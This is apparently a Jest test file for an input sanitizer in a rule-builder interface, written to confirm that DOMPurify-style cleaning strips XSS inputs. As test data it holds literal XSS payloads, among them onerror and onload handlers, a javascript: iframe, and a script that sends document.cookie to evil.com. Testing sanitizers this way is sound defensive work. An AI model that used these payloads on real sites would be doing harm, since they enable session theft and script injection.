import { sanitizeUserInput } from '../../lib/sanitizers/htmlSanitizer';

describe('RuleBuilder Input Sanitization Tests', () => {
  test('should sanitize XSS attempts in rule name input', () => {
    const xssAttempt = "<script>alert('XSS')</script>";
    const sanitized = sanitizeUserInput(xssAttempt);
    
    // The sanitized value should not contain script tags
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert(');
    // DOMPurify removes dangerous content completely, which is correct behavior
    expect(sanitized).toBe(''); // Script content is completely removed
  });

  test('should sanitize XSS attempts in condition value input', () => {
    const xssAttempt = `"><img src=x onerror=alert('XSS')>`;
    const sanitized = sanitizeUserInput(xssAttempt);
    
    // The sanitized value should not contain dangerous attributes
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('alert(');
    // DOMPurify removes dangerous content, leaving only safe parts
    expect(sanitized).toBe('"&gt;'); // Only safe characters remain
  });

  test('should sanitize XSS attempts in escalation target input', () => {
    const xssAttempt = `test@example.com"><svg/onload=alert('XSS')>`;
    const sanitized = sanitizeUserInput(xssAttempt);
    
    // The sanitized value should not contain dangerous elements
    expect(sanitized).not.toContain('<svg');
    expect(sanitized).not.toContain('onload');
    expect(sanitized).not.toContain('alert(');
    expect(sanitized).toContain('test@example.com'); // Email should be preserved
  });

  test('should sanitize XSS attempts in description textarea', () => {
    const xssAttempt = `<iframe src="javascript:alert('XSS')"></iframe>`;
    const sanitized = sanitizeUserInput(xssAttempt);
    
    // The sanitized value should not contain iframe or javascript URLs
    expect(sanitized).not.toContain('<iframe');
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('alert(');
    // DOMPurify removes dangerous content completely
    expect(sanitized).toBe(''); // Iframe content is completely removed
  });

  test('should preserve legitimate content while sanitizing dangerous elements', () => {
    const legitimateContent = "Customer Support Rule - Handle urgent requests";
    const sanitized = sanitizeUserInput(legitimateContent);
    
    // Legitimate content should be preserved
    expect(sanitized).toBe(legitimateContent);
  });

  test('should handle empty input', () => {
    const emptyInput = "";
    const sanitized = sanitizeUserInput(emptyInput);
    
    expect(sanitized).toBe("");
  });

  test('should handle null input', () => {
    const nullInput = null;
    const sanitized = sanitizeUserInput(nullInput);
    
    expect(sanitized).toBe("");
  });

  test('should handle undefined input', () => {
    const undefinedInput = undefined;
    const sanitized = sanitizeUserInput(undefinedInput);
    
    expect(sanitized).toBe("");
  });

  test('should sanitize complex XSS payloads', () => {
    const complexXSS = `<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>`;
    const sanitized = sanitizeUserInput(complexXSS);
    
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.location');
    expect(sanitized).not.toContain('evil.com');
  });

  test('should sanitize HTML entities properly', () => {
    const htmlEntities = "&lt;script&gt;alert('XSS')&lt;/script&gt;";
    const sanitized = sanitizeUserInput(htmlEntities);
    
    // HTML entities should be preserved as they are safe
    expect(sanitized).toContain('&lt;');
    expect(sanitized).toContain('&gt;');
  });
});
